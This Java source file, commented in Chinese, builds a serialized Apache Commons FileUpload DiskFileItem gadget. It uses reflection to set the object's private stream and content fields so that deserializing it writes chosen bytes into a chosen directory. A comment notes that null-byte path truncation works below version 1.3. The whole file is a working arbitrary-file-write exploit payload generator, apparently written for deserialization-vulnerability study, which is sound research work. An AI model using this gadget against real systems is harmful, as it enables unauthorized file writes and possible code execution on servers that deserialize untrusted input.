import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;
import java.io.File;
import java.lang.reflect.Field;

public class Main {
    public static void main(String[] args) throws Exception {
        // 创建文件写入目录 File 对象，以及文件写入内容
        String charset = "UTF-8";
        byte[] bytes   = "hahaha".getBytes(charset);

        // 在 1.3 版本以下，可以使用 \0 截断
//        File repository = new File("D:\\123");

        // 在 1.3 及以上，只能指定目录
		File repository = new File("D:/");

        // 创建 dfos 对象
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);

        // 使用 repository 初始化反序列化的 DiskFileItem 对象
        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);

        // 序列化时 writeObject 要求 dfos 不能为 null
        setFieldValue(diskFileItem,"dfos",dfos);

        // 反射将 cachedContent 写入
        setFieldValue(diskFileItem,"cachedContent",bytes);

        FileStream.writeSer(diskFileItem,"FileUpload.ser");
        FileStream.readSer("FileUpload.ser");
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
